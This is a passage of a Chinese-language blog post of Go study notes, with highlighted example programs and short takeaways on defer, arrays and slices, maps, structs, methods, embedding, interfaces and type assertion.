&#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;func: 调用了defer&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> returnFunc()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">returnFunc</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;func: 调用了return&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//在当前函数结束之前调用,按入栈顺序执行</span></span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;main: main end1&quot;</span>)</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;main: main end2&quot;</span>)</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;main: main go 1&quot;</span>)</span><br><span class="line">fmt.Println(<span class="string">&quot;main: main go 2&quot;</span>)</span><br><span class="line"></span><br><span class="line">deferAndReturn()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109154930773.png" alt="image-20230109154930773"></p><p><strong>知识点：</strong></p><p>(1) 使用defer后会将当前语句<strong>入栈</strong>，在当前函数结束之前<strong>依次出栈</strong></p><p>(2) 注意defer是在return之后执行的</p><h1 id="五、golang中的数组"><a href="#五、golang中的数组" class="headerlink" title="五、golang中的数组"></a>五、golang中的数组</h1><h2 id="1-静态数组"><a href="#1-静态数组" class="headerlink" title="1.静态数组"></a>1.静态数组</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printArray</span><span class="params">(myArray [10]<span class="type">int</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span> index,value := <span class="keyword">range</span> myArray&#123;</span><br><span class="line">fmt.Println(index,value)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//固定长度数组</span></span><br><span class="line"><span class="keyword">var</span> myarray1 [<span class="number">10</span>]<span class="type">int</span></span><br><span class="line">myarray2 := [<span class="number">10</span>]<span class="type">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>; i&lt;<span class="built_in">len</span>(myarray1); i++ &#123;</span><br><span class="line">fmt.Println(myarray1[i])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printArray(myarray2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><img src="/images/Golang学习笔记.assets/image-20230109161755282.png" alt="image-20230109161755282" style="zoom:50%;"><p><strong>知识点：</strong></p><p>(1) 声明数组后，其中元素默认值为0</p><p>(2) 函数的形参和传递实参的长度一定要对应</p><h2 id="2-动态数组"><a href="#2-动态数组" class="headerlink" title="2.动态数组"></a>2.动态数组</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printArray</span><span class="params">(myArray []<span class="type">int</span>)</span></span> &#123;</span><br><span class="line"><span class="comment">//引用传递，不是值传递</span></span><br><span class="line"><span class="comment">//_表示匿名的变量</span></span><br><span class="line"><span class="keyword">for</span> _, value := <span class="keyword">range</span> myArray &#123;</span><br><span class="line">fmt.Println(value)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//动态数组</span></span><br><span class="line"><span class="comment">//声明并初始化，默认值为1，2，3 长度len是3</span></span><br><span class="line">slice1 := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line">printArray(slice1)</span><br><span class="line">fmt.Printf(<span class="string">&quot;len=%d,slice=%v\n&quot;</span>, <span class="built_in">len</span>(slice1), slice1)</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明一个动态数组，但是不给他分配空间</span></span><br><span class="line"><span class="keyword">var</span> slice2 []<span class="type">int</span></span><br><span class="line"><span class="comment">//使用make开辟3个空间，默认值为0</span></span><br><span class="line">slice2 = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109162247440.png" alt="image-20230109162247440"></p><h2 id="3-动态数组的容量"><a href="#3-动态数组的容量" class="headerlink" title="3.动态数组的容量"></a>3.动态数组的容量</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> numbers = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line"><span class="comment">//长度和容量</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;len=%d,cap=%d,slice=%v\n&quot;</span>, <span class="built_in">len</span>(numbers), <span class="built_in">cap</span>(numbers), numbers)</span><br><span class="line"><span class="comment">//向slice中追加元素1</span></span><br><span class="line">numbers = <span class="built_in">append</span>(numbers, <span class="number">1</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;len=%d,cap=%d,slice=%v\n&quot;</span>, <span class="built_in">len</span>(numbers), <span class="built_in">cap</span>(numbers), numbers)</span><br><span class="line"><span class="comment">//再向slice追加两个元素，超过cap</span></span><br><span class="line"><span class="comment">//他会自动扩充一个原始cap的大小,我们可以将看到cap变成了10（5+5）</span></span><br><span class="line">numbers = <span class="built_in">append</span>(numbers, <span class="number">2</span>)</span><br><span class="line">numbers = <span class="built_in">append</span>(numbers, <span class="number">3</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;len=%d,cap=%d,slice=%v\n&quot;</span>, <span class="built_in">len</span>(numbers), <span class="built_in">cap</span>(numbers), numbers)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109162344449.png" alt="image-20230109162344449"></p><p><strong>知识点：</strong></p><p>(1) 使用make为数组开辟空间时，可以指定数组的cap,即数组的最大容量</p><p>(2) 当向slice添加的元素超过cap时，会自动扩充一个原始cap的大小</p><h1 id="六、golang中的map"><a href="#六、golang中的map" class="headerlink" title="六、golang中的map"></a>六、golang中的map</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//声明一个map</span></span><br><span class="line"><span class="keyword">var</span> myMap1 <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//给map分配空间</span></span><br><span class="line">myMap1 = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>, <span class="number">10</span>)</span><br><span class="line">myMap1[<span class="string">&quot;one&quot;</span>] = <span class="string">&quot;java&quot;</span></span><br><span class="line">myMap1[<span class="string">&quot;two&quot;</span>] = <span class="string">&quot;c++&quot;</span></span><br><span class="line"></span><br><span class="line">fmt.Println(myMap1)</span><br><span class="line"></span><br><span class="line"><span class="comment">//另一种声明方式</span></span><br><span class="line">myMap2 := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;a&quot;</span>: <span class="string">&quot;aa&quot;</span>,</span><br><span class="line"><span class="string">&quot;b&quot;</span>: <span class="string">&quot;bb&quot;</span>, <span class="comment">//末尾记得加逗号</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(myMap2)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109162934736.png" alt="image-20230109162934736"></p><h1 id="七、golang面向对象基础"><a href="#七、golang面向对象基础" class="headerlink" title="七、golang面向对象基础"></a>七、golang面向对象基础</h1><h2 id="1-struct的使用"><a href="#1-struct的使用" class="headerlink" title="1.struct的使用"></a>1.struct的使用</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//type关键字 声明一种新的数据类型 ，int的一个别名</span></span><br><span class="line"><span class="keyword">type</span> myint <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个结构体</span></span><br><span class="line"><span class="keyword">type</span> Book <span class="keyword">struct</span> &#123;</span><br><span class="line">title <span class="type">string</span></span><br><span class="line">auth  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">printBook</span><span class="params">(book Book)</span></span> &#123;</span><br><span class="line"><span class="comment">//值传递,传递一个book的副本，不改变值</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%v\n&quot;</span>, book)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">changeBook</span><span class="params">(book *Book)</span></span> &#123;</span><br><span class="line"><span class="comment">//指针传递</span></span><br><span class="line">book.title = <span class="string">&quot;已经被改变了&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> book1 Book</span><br><span class="line">book1.title = <span class="string">&quot;Golang&quot;</span></span><br><span class="line">book1.auth = <span class="string">&quot;lisi&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// %v表示可以打印任何类型的变量</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;%v\n&quot;</span>, book1)</span><br><span class="line"></span><br><span class="line"><span class="comment">//要传地址</span></span><br><span class="line">changeBook(&amp;book1)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%v\n&quot;</span>, book1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109163244795.png" alt="image-20230109163244795"></p><h2 id="2-创建一个对象"><a href="#2-创建一个对象" class="headerlink" title="2.创建一个对象"></a>2.创建一个对象</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Hero <span class="keyword">struct</span> &#123;</span><br><span class="line">Name  <span class="type">string</span></span><br><span class="line">Ad    <span class="type">int</span></span><br><span class="line">Level <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//名字首字母大写=public 首字母小写=private</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Hero)</span></span> Show() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Name =&quot;</span>, this.Name)</span><br><span class="line">fmt.Println(<span class="string">&quot;Ad =&quot;</span>, this.Ad)</span><br><span class="line">fmt.Println(<span class="string">&quot;Level =&quot;</span>, this.Level)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Hero)</span></span> GetName() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> this.Name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注意set中需要改变值，需要传递指针</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Hero)</span></span> SetName(newName <span class="type">string</span>) &#123;</span><br><span class="line">this.Name = newName</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//创建对象</span></span><br><span class="line">hero := Hero&#123;Name: <span class="string">&quot;zhangsan&quot;</span>, Ad: <span class="number">100</span>, Level: <span class="number">2</span>&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">fmt.Println(hero.GetName())</span><br><span class="line">hero.SetName(<span class="string">&quot;已经改变&quot;</span>)</span><br><span class="line">hero.Show()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109163430306.png" alt="image-20230109163430306"></p><p><strong>知识点：</strong></p><p>(1) 注意成员方法的写法，要在func和函数名之间加上**(变量名 *类名)**，变量名通常用this</p><h2 id="3-类的继承"><a href="#3-类的继承" class="headerlink" title="3.类的继承"></a>3.类的继承</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="type">string</span></span><br><span class="line">sex  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Human)</span></span> Eat() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;开饭了&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Human)</span></span> Walk() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;走起来了&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> SuperMan <span class="keyword">struct</span> &#123;</span><br><span class="line">Human <span class="comment">//SuperMan继承了Human类的方法</span></span><br><span class="line"></span><br><span class="line">level <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重新定义父类的方法Eat()</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *SuperMan)</span></span> Eat() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;超人开饭了&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类的新方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *SuperMan)</span></span> Fly() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;超人飞起来了&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">human := Human&#123;<span class="string">&quot;zhangsan&quot;</span>, <span class="string">&quot;female&quot;</span>&#125;</span><br><span class="line">human.Eat()</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个子类对象</span></span><br><span class="line"><span class="comment">// s := SuperMan&#123;Human&#123;&quot;lisi&quot;,&quot;male&quot;&#125;,99&#125;</span></span><br><span class="line"><span class="keyword">var</span> s SuperMan</span><br><span class="line">s.name = <span class="string">&quot;lisi&quot;</span></span><br><span class="line">s.sex = <span class="string">&quot;male&quot;</span></span><br><span class="line">s.level = <span class="number">99</span></span><br><span class="line">s.Walk()</span><br><span class="line">s.Eat()</span><br><span class="line">s.Fly()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109163924166.png" alt="image-20230109163924166"></p><h2 id="4-创建一个接口"><a href="#4-创建一个接口" class="headerlink" title="4.创建一个接口"></a>4.创建一个接口</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//本质是一个指针</span></span><br><span class="line"><span class="keyword">type</span> AnimalIF <span class="keyword">interface</span>&#123;</span><br><span class="line">Sleep()</span><br><span class="line">GetColor() <span class="type">string</span></span><br><span class="line">GetType() <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//具体的类</span></span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span>&#123;</span><br><span class="line">color <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实现接口的所有方法就是实现它</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Cat)</span></span> Sleep()&#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;猫在睡觉&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Cat)</span></span> GetColor() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> this.color</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Cat)</span></span> GetType() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;cat&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Dog <span class="keyword">struct</span>&#123;</span><br><span class="line">color <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Dog)</span></span> Sleep()&#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;狗在睡觉&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Dog)</span></span> GetColor() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> this.color</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(this *Dog)</span></span> GetType() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;dog&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">showAnimal</span><span class="params">(animal AnimalIF)</span></span>&#123;</span><br><span class="line">animal.Sleep()<span class="comment">//多态</span></span><br><span class="line">fmt.Println(<span class="string">&quot;color = &quot;</span>,animal.GetColor())</span><br><span class="line">fmt.Println(<span class="string">&quot;type = &quot;</span>,animal.GetType())</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">/**var animal AnimalIF//接口的数据类型 父类指针</span></span><br><span class="line"><span class="comment">animal = &amp;Cat&#123;&quot;Green&quot;&#125;</span></span><br><span class="line"><span class="comment">animal.Sleep()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">animal = &amp;Dog&#123;&quot;Yellow&quot;&#125;</span></span><br><span class="line"><span class="comment">animal.Sleep()**/</span></span><br><span class="line">cat := Cat&#123;<span class="string">&quot;Green&quot;</span>&#125;</span><br><span class="line">dog := Dog&#123;<span class="string">&quot;Yellow&quot;</span>&#125;</span><br><span class="line">showAnimal(&amp;cat)</span><br><span class="line">showAnimal(&amp;dog)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109164340679.png" alt="image-20230109164340679"></p><p><strong>知识点：</strong></p><p>(1) 接口使用interface关键字</p><p>(2) 当一个类实现了接口的所有方法后，就相当于是实现了这个接口</p><h2 id="5-interface-万能数据类型"><a href="#5-interface-万能数据类型" class="headerlink" title="5.interface{}万能数据类型"></a>5.interface{}万能数据类型</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//interface&#123;&#125;是万能数据类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myFunc</span><span class="params">(arg <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">fmt.Println(arg)</span><br><span class="line"></span><br><span class="line"><span class="comment">//interface&#123;&#125;如何区分此时引用的底层数据类型是什么呢</span></span><br><span class="line"><span class="comment">//给interface&#123;&#125;提供“类型断言”机制</span></span><br><span class="line">value, ok := arg.(<span class="type">string</span>)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;arg is not string&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;arg is string,value =&quot;</span>, value)</span><br><span class="line">fmt.Printf(<span class="string">&quot;arg type is %T\n&quot;</span>, value)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Book <span class="keyword">struct</span> &#123;</span><br><span class="line">auth <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">book := Book&#123;<span class="string">&quot;Golang&quot;</span>&#125;</span><br><span class="line">myFunc(book)</span><br><span class="line">myFunc(<span class="string">&quot;1234&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><p><img src="/images/Golang%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230109164657848.png" alt="image-20230109164657848"></p><p><strong>知识点：</strong></p><p>(1) 感觉interface{}类似于java中的Object</p><h1 id="八、golang中的反射"><a href="#八、golang中的反射" class="headerlink" title="八、golang中的反射"></a>八、golang中的反射</h1><h2 id="1-变量的内置pair结构"><a href="#1-变量的内置pair结构" class="headerlink" 